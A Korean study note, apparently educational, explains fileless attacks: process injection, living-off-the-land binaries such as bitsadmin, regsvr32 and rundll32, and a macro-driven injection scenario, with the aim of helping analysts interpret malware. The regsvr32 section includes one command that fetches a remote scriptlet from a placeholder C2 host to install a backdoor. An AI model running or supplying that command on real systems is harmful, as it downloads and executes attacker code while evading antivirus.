## 파일리스(Fileless)공격 📂

실행되는 코드가 파일로 생성되지 않고 (=DLL, EXE) **메모리만 존재**하며, **흔적을 남기지 않는** 유형의 공격 

공격자가 보안 솔루션을 우회하고 **흔적을 남기지 않기 위해** 사용하는 공격 유형

<br>

### **특징**

1. **프로세스 인젝션 기술 사용** : 타겟 프로세스에 코드를 삽입하여 그 안에서 실행시키도록 하는 기법 ⇒ 필수요소 
2. **LoL(Living of the Land Binaries) 바이너리 사용** : 현지 자원을 갖고 공격. 기존에 설치된 built-in 프로그램을 이용하여 공격 
3. **스크립팅** : 파워쉘
4. **Fileless Persistence** : 레지스트리(디스크터치가 발생하기 때문에 탐지가 쉬움) ⇒ 사용X

⇒ 디스크를 사용하지 않고자 하는 공격자의 의도 

<br>

### 파일리스 공격 시나리오

1. 사용자가 docx파일을 실행하면 문서 안에 숨어있는 매크로 코드 실행
2. 윈도우 시스템에 built-in으로 설치된 rundll32.exe라는 파일이 실행 ⇒ rundll파일은 악성파일이X 그래서 안티바이러스도 rundll이 실행된 건 무시 
3. 코드인젝션 수행

⇒ DISK Writing 행위가 없음. ⇒ **빌트인 프로그램과 리소스를 이용**하여 공격 목표를 달성하고자 하는 파일리스 공격의 특징 

<br>

## 01 LoL Bins (Living Off the Land Binaries)

**Bitsadmin.exe**

- 윈도우 업데이트를 위해 사용하는 매우 정상적인 실행파일
- 이를 이용해서 악성코드 실행

<br>

**regsvr32.exe**

- DLL파일을 등록하거나 등록 취소하는 데 사용되는 유틸리티
- `> regsvr32 /s /n /u /i:http://C2/backdoor.sct scrobj.dll`
⇒ 해당 유틸리티의 다양한 매개변수를 사용해서 백도어를 줄 수 있음

<br>

## 02 프로세스 인젝션

정상적인 프로세스의 **유저 메모리 영역**에 악성코드를 기록(주입)한 후 실행하는 테크닉 

**explore.exe 이용 - 윈도우에서 로그인하는 즉시 실행되는 계속 실행되는 정상적인 프로그램.**

<br>

**목적**

- 주로 디펜스 우회나 권한상승
- 정상적인 프로세스에서 실행되므로 탐지하기 어려움
- 타겟 프로세스에 주입하여 실행할 코드를 네트워크를 통해 다운로드하는 경우 2차 저장매체에 코드를 남기지 않음(파일리스)

<br>

공격에 자주 사용되는 LoL바이너리와 API set위주로 공부하여 악성코드가 하고자 하는 동작들을 유추하고 해석하는 습관
